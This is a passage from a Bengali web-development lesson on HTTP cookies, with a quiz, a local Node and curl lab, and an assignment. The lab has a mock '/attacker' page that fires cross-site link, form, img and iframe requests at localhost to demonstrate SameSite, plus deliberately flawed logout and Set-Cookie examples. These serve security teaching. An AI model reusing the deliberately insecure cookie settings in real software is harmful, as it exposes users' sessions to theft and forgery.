                  CSRF আটকায় স্তরে স্তরে: SameSite, GET এ কিছু না বদলানো, Origin যাচাই, CSRF Token।
                  Third-party Cookie এর উপর ভরসা করে কিছু বানাবেন না। Login Cookie এর নাম{" "}
                  <code>__Host-</code> দিয়ে শুরু করুন, আর মোছার সময় একই নাম, Path আর Secure।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                এবার একটা অনুচ্ছেদে, যেভাবে আপনি অন্য কাউকে বলবেন। পর্যটক Login করলেন, Server একটা
                Random নম্বর বানিয়ে Redis এ লিখে রাখল আর Set-Cookie দিয়ে নম্বরটা Browser কে দিল।
                Browser নাম দেখে বুঝল এটা একটা <code>__Host-</code> Cookie, শর্ত মিলিয়ে Jar এ রাখল।
                এরপর প্রতিটা Request এর আগে সে চারটা প্রশ্ন করে: নামটা মেলে, Path মেলে, HTTPS কি না, আর
                Request টা একই Site থেকে শুরু কি না। চারটা হ্যাঁ হলে Cookie যায়। Secure আছে বলে ক্যাফের
                Wi-Fi তে কেউ পড়তে পারে না, HttpOnly আছে বলে পাতার Script চুরি করতে পারে না, Lax আছে বলে
                অন্য সাইটের লুকানো Form কাজ করে না। আর Logout এ Server Redis থেকে নম্বরটা মোছে আর
                Browser কে বলে একই নামের Cookie টা এখনই মরে যাক।
              </ContentParagraph>
              <ContentParagraph>
                এই অনুচ্ছেদের প্রতিটা বাক্যে কেউ কেন জিজ্ঞেস করলে উত্তর দিতে পারলে, লেসনটা আপনার
                হয়ে গেছে, আর তখন আপনি এটা অন্যকেও শেখাতে পারবেন।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.TIP,
          title: "এরপর লেসন ০৬, Session vs JWT",
          content: (
            <p>
              পুরো লেসনে আমরা Cookie এর খামটা নিয়ে কথা বলেছি, ভেতরের চিঠি নিয়ে নয়। খামে কী থাকবে?
              একটা Random নম্বর, যার মানে Redis এ খুঁজতে হয়? নাকি এমন একটা টোকেন, যার ভেতরেই লেখা
              থাকে মানুষটা কে, আর একটা Signature যেটা দেখে Server নিজেই বিশ্বাস করতে পারে, কিছু না খুঁজে?
              প্রথমটার নাম Server Session, দ্বিতীয়টার নাম JWT। Island Tours এর Website প্রথমটা আর Mobile
              App দ্বিতীয়টা কেন বেছে নিল, আর কোনটা কখন আপনার জন্য ঠিক, সেটাই পরের লেসন:{" "}
              <Link href="/devops/topic/session-vs-jwt" className={linkClass}>
                Session vs JWT
              </Link>
              ।
            </p>
          ),
        },
      ],
    },
  ],
  summary: {
    headers: ["বিষয়", "এক লাইনে"],
    rows: [
      ["Cookie", "Server এর রাখতে বলা নাম আর মানের জোড়া, Browser প্রতিটা মানানসই Request এ ফেরত পাঠায়"],
      ["Set-Cookie", "Response Header, প্রতিটা Cookie এর জন্য আলাদা লাইন, নাম, মান আর Attribute সহ"],
      ["Cookie Header", "Request Header, এক লাইনে শুধু নাম আর মান, Attribute ফেরত আসে না"],
      ["Cookie Jar", "Browser এর Cookie রাখার জায়গা। পরিচয় নাম, Domain আর Path মিলিয়ে"],
      ["Session vs Persistent", "মেয়াদ না দিলে Browser বন্ধ পর্যন্ত, দিলে মেয়াদ পর্যন্ত, সর্বোচ্চ ৪০০ দিন"],
      ["Max-Age", "এত সেকেন্ড পর মেয়াদ শেষ। Expires এর চেয়ে ভালো, শূন্য দিলে মুছে যায়"],
      ["Domain", "না লিখলে Host-only। লিখলে সেই নাম আর তার সব Subdomain"],
      ["Path", "এই Path বা তার নিচের Path এ যায়, পুরো ভাগ ধরে মেলে"],
      ["Secure", "শুধু HTTPS এ যায়। পথের মাঝে পড়ে ফেলা আটকায়"],
      ["HttpOnly", "JavaScript দেখতে পায় না। XSS এ Cookie চুরি আটকায়, XSS নিজে নয়"],
      ["Origin", "Scheme, Host আর Port, তিনটাই হুবহু। CORS এর মাপকাঠি"],
      ["Site", "Scheme আর Registrable Domain। SameSite এর মাপকাঠি, Port দেখে না"],
      ["SameSite", "Strict কখনো না, Lax শুধু Top-level GET, None সব জায়গায় Secure সহ"],
      ["CSRF", "অন্য সাইট থেকে পর্যটকের Browser কে দিয়ে জাল Request। SameSite, Origin যাচাই আর Token দিয়ে আটকানো"],
      ["Third-party Cookie", "Address Bar এর সাইটের নয় এমন Cookie। Safari বন্ধ রাখে, Firefox আলাদা Jar এ, Chrome Default এ চালু"],
      ["Partitioned", "Cookie এর নিজের সাইট আর Address Bar এর সাইট মিলিয়ে আলাদা ভাঁড়ার"],
      ["__Host- Prefix", "Secure, Path=/, Domain নেই, নাহলে Browser নেয় না। মোছার লাইনেও একই শর্ত"],
    ],
  },
  knowledgeCheck: {
    questions: [
      {
        id: 1,
        text: "Server একটা Cookie বসিয়েছিল Secure, HttpOnly আর Max-Age=1209600 সহ। পরের Request এ Server Cookie Header এ কী পায়?",
        options: [
          {
            key: "A",
            text: "নাম, মান আর তিনটা Attribute ই",
            isCorrect: false,
            explanation: "Attribute গুলো একমুখী। Browser মানে, কিন্তু ফেরত পাঠায় না।",
          },
          {
            key: "B",
            text: "শুধু নাম আর মান",
            isCorrect: true,
            explanation: "ঠিক। Cookie Header এ শুধু name=value জোড়া, সেমিকোলন দিয়ে জোড়া। তাই মেয়াদের হিসাব Server এর দিকেও রাখতে হয়।",
          },
          {
            key: "C",
            text: "নাম, মান আর মেয়াদ শেষের তারিখ",
            isCorrect: false,
            explanation: "মেয়াদও ফেরত আসে না। Server জানতেই পারে না Cookie টা কবে মরবে।",
          },
          {
            key: "D",
            text: "কিছুই না, HttpOnly Cookie Server এ যায় না",
            isCorrect: false,
            explanation: "উল্টো। HttpOnly Cookie Server এ ঠিকই যায়, শুধু পাতার JavaScript দেখতে পায় না।",
          },
        ],
      },
      {
        id: 2,
        text: "islandtours.example Domain ছাড়া একটা Cookie বসাল: Set-Cookie: pref=1; Path=/। কোন Request এ এটা যাবে?",
        options: [
          {
            key: "A",
            text: "islandtours.example আর তার সব Subdomain",
            isCorrect: false,
            explanation: "এটা হতো Domain=islandtours.example লিখলে। Domain না লেখা মানে Host-only।",
          },
          {
            key: "B",
            text: "শুধু islandtours.example, blog বা admin না",
            isCorrect: true,
            explanation: "ঠিক। Domain না থাকলে Cookie Host-only, শুধু হুবহু সেই নামে যায়। Login Cookie এর জন্য এটাই সবচেয়ে নিরাপদ।",
          },
          {
            key: "C",
            text: "যেকোনো .example সাইটে",
            isCorrect: false,
            explanation: "example একটা Public Suffix। তার নামে Cookie বসানোই নিষেধ, যাওয়া তো দূরের কথা।",
          },
          {
            key: "D",
            text: "শুধু islandtours.example এর Port 443 এ",
            isCorrect: false,
            explanation: "Cookie Port দেখে না। islandtours.example:8443 এর Request ও এটা পাবে।",
          },
        ],
      },
      {
        id: 3,
        text: "একটা Cookie এর Path=/api। নিচের কোন Request এ Cookie টা যাবে না?",
        options: [
          {
            key: "A",
            text: "/api",
            isCorrect: false,
            explanation: "Path হুবহু মিলেছে, তাই যাবে।",
          },
          {
            key: "B",
            text: "/api/bookings/bk_7Q2M9X",
            isCorrect: false,
            explanation: "/api/ দিয়ে শুরু, তাই যাবে।",
          },
          {
            key: "C",
            text: "/api-docs",
            isCorrect: true,
            explanation: "ঠিক। অক্ষরে /api দিয়ে শুরু হলেও মিলটা হতে হয় পুরো ভাগ ধরে, মানে /api নিজে বা /api/ দিয়ে শুরু। /api-docs কোনোটাই নয়।",
          },
          {
            key: "D",
            text: "/api/",
            isCorrect: false,
            explanation: "/api/ দিয়ে শুরু, তাই যাবে।",
          },
        ],
      },
      {
        id: 4,
        text: "আপনার ল্যাপটপে localhost:3000 এ একটা Project আর localhost:5173 এ আরেকটা চলছে। দুইটাই session নামে Cookie বসায়। কী ঘটবে?",
        options: [
          {
            key: "A",
            text: "কিছু না, আলাদা Port মানে আলাদা Jar",
            isCorrect: false,
            explanation: "localStorage এর জন্য কথাটা সত্যি, Cookie এর জন্য নয়।",
          },
          {
            key: "B",
            text: "দুইটা একই Cookie, একটা Project এ Login করলে আরেকটার Cookie মুছে বা বদলে যাবে",
            isCorrect: true,
            explanation: "ঠিক। Cookie Port দেখে না। একই Host, একই নাম, একই Path মানে Jar এ একটাই Cookie, আর শেষে যে বসাল তারটাই থাকে।",
          },
          {
            key: "C",
            text: "Browser দ্বিতীয় Cookie টা ফেলে দেবে",
            isCorrect: false,
            explanation: "ফেলে দেয় না, পুরনোটার জায়গায় বসিয়ে দেয়।",
          },
          {
            key: "D",
            text: "দুইটাই Cookie Header এ যাবে, পাশাপাশি",
            isCorrect: false,
            explanation: "পাশাপাশি থাকত আলাদা Path হলে। এখানে নাম, Host আর Path তিনটাই এক।",
          },
        ],
      },
      {
        id: 5,
        text: "https://islandtours.example আর https://blog.islandtours.example সম্পর্কে কোনটা ঠিক?",
        options: [
          {
            key: "A",
            text: "একই Origin, একই Site",
            isCorrect: false,
            explanation: "Host আলাদা, তাই Origin আলাদা।",
          },
          {
            key: "B",
            text: "আলাদা Origin, আলাদা Site",
            isCorrect: false,
            explanation: "Registrable Domain দুইটারই islandtours.example, তাই Site এক।",
          },
          {
            key: "C",
            text: "আলাদা Origin, কিন্তু একই Site",
            isCorrect: true,
            explanation: "ঠিক। CORS এর চোখে এরা আলাদা, SameSite এর চোখে আপন। তাই Blog থেকে আসা Form এ Strict Cookie ও যায়।",
          },
          {
            key: "D",
            text: "একই Origin, কিন্তু আলাদা Site",
            isCorrect: false,
            explanation: "এমন হওয়া সম্ভবই নয়। একই Origin হলে Site ও এক।",
          },
        ],
      },
      {
        id: 6,
        text: "Session Cookie টা SameSite=Lax। পর্যটক attacker.example এর পাতায় আছেন। কোন অবস্থায় Browser Cookie টা islandtours.example এ পাঠাবে?",
        options: [
          {
            key: "A",
            text: "পাতাটা লুকানো Form দিয়ে POST পাঠালে",
            isCorrect: false,
            explanation: "Cross-site POST এ Lax Cookie যায় না, এটাই CSRF এর দেয়াল।",
          },
          {
            key: "B",
            text: "পাতাটা একটা img দিয়ে islandtours.example এর ঠিকানা চাইলে",
            isCorrect: false,
            explanation: "পাতার ভেতর থেকে যাওয়া Request, Top-level নয়। Lax দেয় না।",
          },
          {
            key: "C",
            text: "পর্যটক নিজে একটা Link এ ক্লিক করে পুরো পাতাটা islandtours.example এ নিয়ে গেলে",
            isCorrect: true,
            explanation: "ঠিক। Top-level Navigation আর GET, Lax এর একমাত্র ছাড়। তাই GET দিয়ে কখনো কিছু বদলানো চলবে না।",
          },
          {
            key: "D",
            text: "কখনোই না",
            isCorrect: false,
            explanation: "এটা Strict এর আচরণ। Lax Link এর ক্লিকে Cookie দেয়।",
          },
        ],
      },
      {
        id: 7,
        text: "Login Cookie তে HttpOnly দেওয়া হলো। এটা কোন বিপদটা কমায়?",
        options: [
          {
            key: "A",
            text: "ক্যাফের Wi-Fi তে কেউ Cookie Header পড়ে ফেলা",
            isCorrect: false,
            explanation: "এটা আটকায় Secure আর HTTPS। HttpOnly তারের উপর কিছু করে না।",
          },
          {
            key: "B",
            text: "অন্য সাইটের লুকানো Form দিয়ে জাল Request",
            isCorrect: false,
            explanation: "CSRF এ কাউকে Cookie পড়তে হয় না, Browser নিজেই জুড়ে দেয়। এটা আটকায় SameSite আর Origin যাচাই।",
          },
          {
            key: "C",
            text: "পাতায় ঢুকে পড়া Script এর document.cookie পড়ে টোকেন বাইরে পাঠানো",
            isCorrect: true,
            explanation: "ঠিক। HttpOnly Cookie Script দেখতেই পায় না। তবে সেই Script পাতা খোলা থাকতে পর্যটকের নামে Request ঠিকই পাঠাতে পারে।",
          },
          {
            key: "D",
            text: "XSS পুরোপুরি",
            isCorrect: false,
            explanation: "XSS এর ওষুধ Escape করা আর CSP। HttpOnly শুধু ক্ষতির একটা অংশ কমায়।",
          },
        ],
      },
      {
        id: 8,
        text: "Cookie বসানো হয়েছিল lab_session=...; Path=/। Logout এ Server পাঠাল lab_session=; Path=/me; Max-Age=0। এরপর কী হয়?",
        options: [
          {
            key: "A",
            text: "Cookie টা মুছে যায়, নাম মিললেই যথেষ্ট",
            isCorrect: false,
            explanation: "Jar এ পরিচয় নাম, Domain আর Path তিনটা মিলিয়ে। Path না মিললে এটা আরেকটা Cookie।",
          },
          {
            key: "B",
            text: "পুরনো Cookie টা থেকে যায়, পর্যটক Logout হননি",
            isCorrect: true,
            explanation: "ঠিক। Path=/me এর একটা মরা Cookie এর আদেশ গেল, যার কোনো অস্তিত্বই ছিল না। Path=/ এর আসলটা দিব্যি আছে। Lab এর চার নম্বর ধাপে ঠিক এটা দেখবেন।",
          },
          {
            key: "C",
            text: "Browser একটা Error দেখায়",
            isCorrect: false,
            explanation: "Browser কোনো Error দেখায় না, চুপচাপ যা বলা হয়েছে তাই করে। এই কারণেই ভুলটা ধরা কঠিন।",
          },
          {
            key: "D",
            text: "শুধু /me পাতায় Cookie যাওয়া বন্ধ হয়",
            isCorrect: false,
            explanation: "/me ও Path=/ এর নিচে, তাই আসল Cookie টা সেখানেও যেতে থাকে।",
          },
        ],
      },
    ],
  },
  practicalLab: {
    title: "Cookie এর প্রতিটা নিয়ম নিজের যন্ত্রে ঘটান",
    subtitle: "একটা Node Server, curl আর Chrome, sudo লাগবে না",
    stepName: "LAB",
    steps: [
      {
        title: "Server চালান আর Set-Cookie চোখে দেখুন",
        description:
          "Lab Server টা একটা Terminal এ চালু রাখুন। আরেক Terminal থেকে /login চেয়ে Response এর চারটা Set-Cookie লাইন পড়ুন, প্রতিটা Attribute চিনে নিন।",
      },
      {
        title: "curl এর Jar দিয়ে পুরো যাওয়া আসা",
        description:
          "-c দিয়ে Cookie জমা, -b দিয়ে ফেরত পাঠানো। jar.txt ফাইলটা খুলে দেখুন HttpOnly আর মেয়াদ কীভাবে লেখা। তারপর তিনটা Path এ Request পাঠিয়ে দেখুন কে কোন Cookie পায়, আর ৬ সেকেন্ড পরে short কোথায় গেল।",
      },
      {
        title: "Domain: Host-only আর Subdomain",
        description:
          "curl --resolve দিয়ে islandtours.example, blog.islandtours.example আর seagulltours.example তিনটাকেই নিজের যন্ত্রে আনুন। কোন নাম কোন Cookie পায়, আর অন্য সাইটের নামে বসানোর চেষ্টাটার কী হলো, মিলিয়ে নিন।",
      },
      {
        title: "ভুল মোছা, ঠিক মোছা, আর মাপের সীমা",
        description:
          "প্রথমে ভুল Path দিয়ে মুছে দেখুন Cookie টা থেকে যায়, তারপর ঠিক Path দিয়ে। এরপর একটা 5000 Byte এর Cookie বসানোর চেষ্টা আর একটা 20000 Byte এর Cookie Header পাঠানো।",
      },
      {
        title: "Chrome এ HttpOnly",
        description:
          "Chrome এ Login করে মূল পাতায় যান। পাতাটা নিজে document.cookie পড়ে দেখায়। lab_session সেখানে নেই কেন, আর api_hint ও নেই কেন, দুইটার দুইটা আলাদা কারণ বের করুন। তারপর DevTools এর Application Panel এ সবগুলো দেখুন।",
      },
      {
        title: "Chrome এ SameSite, দুইটা আলাদা Site থেকে",
        description:
          "localhost এ চার রকম SameSite এর চারটা Cookie বসান, তারপর 127.0.0.1 এর পাতা থেকে Link, Form, img আর iframe দিয়ে Request পাঠান। প্রতিবার Server এর Terminal এ দেখুন কোনটা গেল। ২ মিনিট অপেক্ষা করে Form টা আবার জমা দিন।",
      },
    ],
    codeBlocks: [
      {
        filename: "cookie-lab.mjs",
        language: "javascript",
        code: `// চালান:  LAB_PORT=47650 node cookie-lab.mjs
// এই Terminal খোলা রাখুন। প্রতিটা Request এ কোন কোন Cookie এলো, এখানে লেখা হবে।
import http from "node:http";
import { randomBytes } from "node:crypto";

const port = Number(process.env.LAB_PORT);
if (!port) throw new Error("LAB_PORT is not set");

// Browser পাঠায় শুধু "a=1; b=2"। কোনো Attribute ফেরত আসে না।
function parseCookies(header = "") {
  const jar = {};
  for (const part of header.split(";")) {
    const at = part.indexOf("=");
    if (at < 1) continue;
    jar[part.slice(0, at).trim()] = part.slice(at + 1).trim();
  }
  return jar;
}

function echo(req, res) {
  const names = Object.keys(parseCookies(req.headers.cookie));
  console.log(\`\${req.method} \${req.headers.host}\${req.url}  cookies: \${names.join(", ") || "(none)"}\`);
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.end(JSON.stringify({ path: req.url, cookieHeader: req.headers.cookie ?? null }, null, 2) + "\\n");
}

function page(res, body) {
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.end(\`<!doctype html><meta charset="utf-8"><title>cookie lab</title>\${body}\`);
}

const routes = {
  "/": (req, res) =>
    page(res, \`<h1>Cookie Lab</h1>
      <p>First open <a href="/login">/login</a>, then come back and reload.</p>
      <p>document.cookie sees: <code id="js"></code></p>
      <script>document.getElementById("js").textContent = document.cookie || "(empty)";</script>\`),

  "/login": (req, res) => {
    const sid = randomBytes(32).toString("base64url");
    res.setHeader("Set-Cookie", [
      \`lab_session=\${sid}; Path=/; HttpOnly; SameSite=Lax\`,
      "theme=dark; Path=/; Max-Age=31536000; SameSite=Lax",
      "api_hint=1; Path=/api; SameSite=Lax",
      "short=1; Path=/; Max-Age=5; SameSite=Lax",
    ]);
    res.end("logged in\\n");
  },

  "/domain/set": (req, res) => {
    res.setHeader("Set-Cookie", [
      "host_only=1; Path=/; SameSite=Lax",
      "shared=1; Domain=islandtours.example; Path=/; SameSite=Lax",
      // অন্য Site এর নামে Cookie বসানোর চেষ্টা। Browser আর curl দুইজনই ফেলে দেবে।
      "foreign=1; Domain=seagulltours.example; Path=/; SameSite=Lax",
    ]);
    res.end(\`set on \${req.headers.host}\\n\`);
  },

  "/logout-wrong": (req, res) => {
    // ভুল: বসানো হয়েছিল Path=/ দিয়ে, মোছা হচ্ছে Path=/me দিয়ে
    res.setHeader("Set-Cookie", "lab_session=; Path=/me; Max-Age=0");
    res.end("logout attempted with the wrong Path\\n");
  },

  "/logout": (req, res) => {
    res.setHeader("Set-Cookie", "lab_session=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax");
    res.end("logged out\\n");
  },

  "/big": (req, res) => {
    // নাম আর মান মিলিয়ে 4096 Byte এর বেশি। Browser এটা জমাবেই না।
    res.setHeader("Set-Cookie", \`big=\${"x".repeat(5000)}; Path=/; SameSite=Lax\`);
    res.end("tried to set a 5000 byte cookie\\n");
  },

  "/samesite/set": (req, res) => {
    res.setHeader("Set-Cookie", [
      "ss_strict=1; Path=/; SameSite=Strict",
      "ss_lax=1; Path=/; SameSite=Lax",
      "ss_none=1; Path=/; SameSite=None; Secure",
      "ss_default=1; Path=/",
    ]);
    page(res, \`<p>Four cookies set on \${req.headers.host}. Now open
      <code>http://127.0.0.1:\${port}/attacker</code> in a new tab.</p>\`);
  },

  "/attacker": (req, res) => {
    const target = \`http://localhost:\${port}/samesite/check\`;
    page(res, \`<h1>Another site: \${req.headers.host}</h1>
      <p><a href="\${target}?via=link">1. Click this link (top level GET)</a></p>
      <form method="POST" action="\${target}?via=form"><button>2. Submit this form (top level POST)</button></form>
      <p>3. An image: <img src="\${target}?via=img" width="1" height="1" alt=""></p>
      <p>4. An iframe:</p><iframe src="\${target}?via=iframe" width="480" height="80"></iframe>\`);
  },
};

http
  .createServer((req, res) => {
    const path = new URL(req.url, "http://lab.invalid").pathname;
    (routes[path] ?? echo)(req, res);
  })
  .listen(port, () => console.log(\`cookie lab on http://localhost:\${port}\`));

// Server এর Terminal এ প্রতিটা Request এর পরে এরকম লাইন আসে (এই যন্ত্রের আসল Log):
//   cookie lab on http://localhost:47650
//   GET localhost:47650/me  cookies: lab_session, theme, short
//   GET localhost:47650/api/tours  cookies: api_hint, lab_session, theme, short
//   GET localhost:47650/apix  cookies: lab_session, theme, short
//   GET localhost:47650/me  cookies: lab_session, theme`,
      },
      {
        filename: "1-see-set-cookie.sh",
        language: "bash",
        code: `#!/usr/bin/env bash
# চালান:  LAB_PORT=47650 bash 1-see-set-cookie.sh
set -euo pipefail
: "\${LAB_PORT:?LAB_PORT is not set}"

# -i মানে Response এর Header ও দেখাও, শুধু Body নয়
curl -s -i "http://localhost:\${LAB_PORT}/login"

# এই যন্ত্রে চালানোর আসল ফলাফল (Random মানগুলো ছোট করে দেখানো, আপনার আলাদা হবে):
#   HTTP/1.1 200 OK
#   Set-Cookie: lab_session=El4TG_...; Path=/; HttpOnly; SameSite=Lax
#   Set-Cookie: theme=dark; Path=/; Max-Age=31536000; SameSite=Lax
#   Set-Cookie: api_hint=1; Path=/api; SameSite=Lax
#   Set-Cookie: short=1; Path=/; Max-Age=5; SameSite=Lax
#   Date: Sat, 31 Oct 2026 06:38:30 GMT
#   Connection: keep-alive
#   Keep-Alive: timeout=5
#   Content-Length: 10
#
#   logged in`,
      },
      {
        filename: "2-jar-and-path.sh",
        language: "bash",
        code: `#!/usr/bin/env bash
# চালান:  LAB_PORT=47650 bash 2-jar-and-path.sh
set -euo pipefail
: "\${LAB_PORT:?LAB_PORT is not set}"
BASE="http://localhost:\${LAB_PORT}"

rm -f jar.txt
# -c jar.txt: যত Set-Cookie আসবে, এই ফাইলে লিখে রাখো (curl এর নিজের Cookie Jar)
curl -s -c jar.txt "\${BASE}/login" > /dev/null

echo "--- jar.txt এর ভেতরে"
grep -v '^# ' jar.txt | grep -v '^$'

# -b jar.txt: ফাইলের Cookie গুলোর মধ্যে যেগুলো এই URL এ মেলে, সেগুলো পাঠাও
for path in /me /api/tours /api-docs; do
  echo "--- GET \${path}"
  curl -s -b jar.txt "\${BASE}\${path}" | grep cookieHeader
done

echo "--- ৬ সেকেন্ড অপেক্ষা, short এর Max-Age=5"
sleep 6
curl -s -b jar.txt "\${BASE}/me" | grep cookieHeader

# এই যন্ত্রে চালানোর আসল ফলাফল (Random মানগুলো ছোট করে দেখানো, আপনার আলাদা হবে):
#   --- jar.txt এর ভেতরে
#   localhost	FALSE	/	FALSE	1793428732	short	1
#   localhost	FALSE	/api	FALSE	0	api_hint	1
#   localhost	FALSE	/	FALSE	1824964727	theme	dark
#   #HttpOnly_localhost	FALSE	/	FALSE	0	lab_session	yUNEd7...
#   --- GET /me
#     "cookieHeader": "lab_session=yUNEd7...; theme=dark; short=1"
#   --- GET /api/tours
#     "cookieHeader": "api_hint=1; lab_session=yUNEd7...; theme=dark; short=1"
#   --- GET /api-docs
#     "cookieHeader": "lab_session=yUNEd7...; theme=dark; short=1"
#   --- ৬ সেকেন্ড অপেক্ষা, short এর Max-Age=5
#     "cookieHeader": "lab_session=yUNEd7...; theme=dark"`,
      },
      {
        filename: "3-domain.sh",
        language: "bash",
        code: `#!/usr/bin/env bash
# চালান:  LAB_PORT=47650 bash 3-domain.sh   (Server টা আগে থেকে চালু থাকতে হবে)
set -euo pipefail
: "\${LAB_PORT:?LAB_PORT is not set}"

# তিনটা নামই এই যন্ত্রের 127.0.0.1 এ পাঠাই, DNS ছাড়া (Module 04 এর curl --resolve)
R=(--resolve "islandtours.example:\${LAB_PORT}:127.0.0.1"
   --resolve "blog.islandtours.example:\${LAB_PORT}:127.0.0.1"
   --resolve "seagulltours.example:\${LAB_PORT}:127.0.0.1")

rm -f domain-jar.txt
curl -s "\${R[@]}" -c domain-jar.txt "http://islandtours.example:\${LAB_PORT}/domain/set"

for host in islandtours.example blog.islandtours.example seagulltours.example; do
  echo "--- \${host}"
  curl -s "\${R[@]}" -b domain-jar.txt "http://\${host}:\${LAB_PORT}/me" | grep cookieHeader
done

echo "--- jar"
grep -v '^# ' domain-jar.txt | grep -v '^$'

# এই যন্ত্রে চালানোর আসল ফলাফল (Random মানগুলো ছোট করে দেখানো, আপনার আলাদা হবে):
#   set on islandtours.example:47650
#   --- islandtours.example
#     "cookieHeader": "host_only=1; shared=1"
#   --- blog.islandtours.example
#     "cookieHeader": "shared=1"
#   --- seagulltours.example
#     "cookieHeader": null
#   --- jar
#   .islandtours.example	TRUE	/	FALSE	0	shared	1
#   islandtours.example	FALSE	/	FALSE	0	host_only	1`,
      },
      {
        filename: "4-delete-and-size.sh",
        language: "bash",
        code: `#!/usr/bin/env bash
# চালান:  LAB_PORT=47650 bash 4-delete-and-size.sh
set -euo pipefail
: "\${LAB_PORT:?LAB_PORT is not set}"
BASE="http://localhost:\${LAB_PORT}"

rm -f jar.txt
curl -s -c jar.txt "\${BASE}/login" > /dev/null

echo "--- ভুল Path দিয়ে মোছার চেষ্টা"
curl -s -i -b jar.txt -c jar.txt "\${BASE}/logout-wrong" | grep -i '^set-cookie'
curl -s -b jar.txt "\${BASE}/me" | grep cookieHeader

echo "--- ঠিক Path দিয়ে মোছা"
curl -s -i -b jar.txt -c jar.txt "\${BASE}/logout" | grep -i '^set-cookie'
curl -s -b jar.txt "\${BASE}/me" | grep cookieHeader

echo "--- 5000 Byte এর একটা Cookie জমানোর চেষ্টা"
curl -s -b jar.txt -c jar.txt "\${BASE}/big"
grep -q 'big' jar.txt && echo "jar এ big আছে" || echo "jar এ big নেই"

echo "--- 20000 Byte এর একটা Cookie Header পাঠানো"
BIG=$(head -c 20000 /dev/zero | tr '\\0' 'a')
curl -s -o /dev/null -w "status %{http_code}\\n" -H "Cookie: big=\${BIG}" "\${BASE}/me"

# এই যন্ত্রে চালানোর আসল ফলাফল (Random মানগুলো ছোট করে দেখানো, আপনার আলাদা হবে):
#   --- ভুল Path দিয়ে মোছার চেষ্টা
#   Set-Cookie: lab_session=; Path=/me; Max-Age=0
#     "cookieHeader": "lab_session=6n1ufs...; short=1; theme=dark"
#   --- ঠিক Path দিয়ে মোছা
#   Set-Cookie: lab_session=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
#     "cookieHeader": "theme=dark; short=1"
#   --- 5000 Byte এর একটা Cookie জমানোর চেষ্টা
#   tried to set a 5000 byte cookie
#   jar এ big নেই
#   --- 20000 Byte এর একটা Cookie Header পাঠানো
#   status 431`,
      },
      {
        filename: "5-in-the-browser.sh",
        language: "bash",
        code: `#!/usr/bin/env bash
# চালান:  LAB_PORT=47650 bash 5-in-the-browser.sh   (Server চালু থাকতে হবে, Chrome এ করুন)
set -euo pipefail
: "\${LAB_PORT:?LAB_PORT is not set}"
OPEN=$(command -v open || command -v xdg-open)   # macOS এ open, Linux এ xdg-open

# ক. HttpOnly: Login করে পাতায় ফিরুন, পাতাটা নিজে document.cookie পড়ে দেখাবে
"$OPEN" "http://localhost:\${LAB_PORT}/login"
sleep 1
"$OPEN" "http://localhost:\${LAB_PORT}/"

# খ. SameSite: localhost এ চারটা Cookie বসান, তারপর অন্য একটা Site থেকে Request পাঠান।
#    127.0.0.1 আর localhost একই যন্ত্র, একই Port, কিন্তু Browser এর চোখে আলাদা Site।
"$OPEN" "http://localhost:\${LAB_PORT}/samesite/set"
sleep 1
"$OPEN" "http://127.0.0.1:\${LAB_PORT}/attacker"

# এবার attacker পাতায় Link এ ক্লিক করুন, ফিরে এসে Form Submit করুন,
# আর প্রতিবার Server এর Terminal এ দেখুন ss_ দিয়ে শুরু কোন নামগুলো এলো।

# Chrome এ যা দেখার কথা (এই অংশটা Browser এর, তাই নিজে মিলিয়ে নিন):
#   ক. পাতায় document.cookie sees: theme=dark
#      lab_session নেই কারণ HttpOnly, api_hint নেই কারণ তার Path=/api আর পাতাটা /।
#      ৫ সেকেন্ডের মধ্যে খুললে short=1 ও দেখবেন।
#   খ. Server এর Terminal এ ss_ নামগুলো:
#      Link এ ক্লিক       ss_lax, ss_none, ss_default      (Strict বাদ)
#      Form Submit        ss_none, আর ২ মিনিটের মধ্যে হলে ss_default ও
#      img আর iframe      শুধু ss_none, যদি Chrome এ Third-party Cookie চালু থাকে
#   Safari বা Firefox এ ss_default আর ss_none এর ফল আলাদা হবে, সেকশন ০০৮ আর ০১০ দেখুন।`,
      },
    ],
    tip: "ধাপ ২ আর ধাপ ৬ পাশাপাশি রেখে ভাবুন। curl এর Jar Domain, Path, মেয়াদ, Secure আর Prefix সব মানে, তাই সেগুলো Browser ছাড়াই পরীক্ষা করা যায়। কিন্তু SameSite curl পরীক্ষা করতে পারে না, কারণ SameSite এর প্রশ্নটাই হলো Request কোন পাতা থেকে শুরু, আর curl এ কোনো পাতা নেই। Production এ একটা Cookie না যাওয়ার রহস্য পেলে তাই প্রথমে curl দিয়ে দেখুন সমস্যাটা Domain, Path বা Secure এর কি না। curl এ ঠিক চললে আর Browser এ না চললে, উত্তর প্রায় নিশ্চিতভাবেই SameSite বা Third-party Cookie এর নিয়মে, আর Chrome এর Network Panel এর হলুদ চিহ্নটা আপনাকে বলে দেবে কোনটা।",
  },
  assignment: {
    title: "Mini Project: my-tours এর Cookie, নিরাপদভাবে",
    time: "৯০ মিনিট",
    difficulty: "Intermediate",
    tasks: [
      <span key="1">
        <strong>তিনটা সাইটের Cookie পড়ুন:</strong> প্রতিদিন ব্যবহার করেন এমন তিনটা সাইটে Login করে
        DevTools এর Application Panel খুলুন। প্রতিটা সাইটের Login Cookie টা খুঁজে বের করুন, আর তার
        Domain, Path, মেয়াদ, HttpOnly, Secure আর SameSite একটা ছকে লিখুন। কোনো Cookie এর মান লিখবেন
        না। প্রতিটার পাশে এক লাইনে মত দিন, এই সাইট কি এই লেসনের নিয়ম মেনেছে, না মানলে কোথায়।
      </span>,
      <span key="2">
        <strong>পুরো যাওয়া আসা এঁকে দেখান:</strong> কাগজে Island Tours এর Login থেকে Logout এর ছবি
        আঁকুন। Browser, Caddy, App আর Redis চারটা বাক্স, প্রতিটা Set-Cookie আর Cookie Header তীর
        হিসেবে। সাথে blog.islandtours.example এর একটা Request, আর দেখান সেখানে কোন Cookie যায় আর কোনটা
        যায় না, কেন।
      </span>,
      <span key="3">
        <strong>একটা খারাপ Cookie সারান:</strong> এই লাইনটার প্রতিটা ভুল খুঁজে বের করুন আর কেন ভুল তা
        লিখুন: <code>Set-Cookie: session=usr_42; Domain=islandtours.example; Path=/; Max-Age=31536000</code>
